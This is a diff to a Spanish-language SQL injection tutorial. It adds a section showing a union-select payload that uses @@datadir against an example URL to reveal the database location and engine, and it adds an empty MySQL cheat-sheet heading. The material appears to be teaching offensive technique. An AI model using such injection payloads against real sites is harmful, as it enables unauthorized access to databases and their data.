@@ -10,6 +10,7 @@
       * [Detectar el número de columnas](#Detectar-el-número-de-columnas)
       * [Usando union select](#Usando-union-select)
       * [Sacando información](#Sacando-información)
+         * [mysql sql Injection Cheat Sheet](#mysql-sql-Injection-Cheat-Sheet)
     * [Inyección sql automatizada con sqlmap](#Inyección-sql-automatizada-con-sqlmap)
 
 
@@ -144,6 +145,19 @@ http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4
 
 Al inyectar `'soy vulnerable'` le estamos diciendo a la página que queremos que por la columna numero 5 nos muestre la frase `soy vulnerable` ya que estamos inyectando un string directamente en la columna vulnerable 
 
+Algo que recomiendo mucho es usar `@@datadir`, Este nos muestra en donde esta montada la base de datos, pero al mismo tiempo nos nuesta informacion de que base de datos es, imaginemos que inyectamos y nos muestra esto:
+
+
+```
+http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,@@datadir,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
+```
+Nos muestra:
+
+`/var/lib/mysql/`
+
+Esto significa que la base de datos esta en esa ruta y al mismo tiempo nos dice que la base de datos usada es `mysql`, entonces nos enfocamos en esa base de datos.
+
+### mysql sql Injection Cheat Sheet
 
 
 
